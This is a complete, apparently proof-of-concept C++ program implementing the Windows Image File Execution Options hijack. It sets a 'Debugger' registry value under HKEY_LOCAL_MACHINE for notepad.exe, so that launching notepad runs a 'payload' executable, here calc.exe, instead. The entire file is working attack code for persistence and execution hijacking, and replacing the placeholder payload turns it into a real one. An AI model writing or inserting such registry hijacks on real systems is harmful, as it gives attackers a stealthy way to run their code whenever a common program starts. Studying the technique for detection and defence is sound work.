// ifeo.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <tchar.h>
#include "processutils.h"

int main(int argc, char** argv)
{
	WCHAR target[MAX_PATH] = L"notepad.exe";
	WCHAR payload[MAX_PATH] = L"calc.exe";
	SIZE_T payloadLength = (lstrlenW(payload) + 1) * sizeof(WCHAR);

	WCHAR keyPath[MAX_PATH] = {};
	wsprintf(keyPath, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s", target);

	HKEY key;
	if (RegCreateKey(HKEY_LOCAL_MACHINE, keyPath, &key) != ERROR_SUCCESS)
		return PrintLastError("RegCreateKey");

	if(RegSetValueEx(key, L"Debugger", 0, REG_SZ, (BYTE*)payload, payloadLength) != ERROR_SUCCESS)
		return PrintLastError("RegSetValueEx");

	RegCloseKey(key);
	return 0;
}
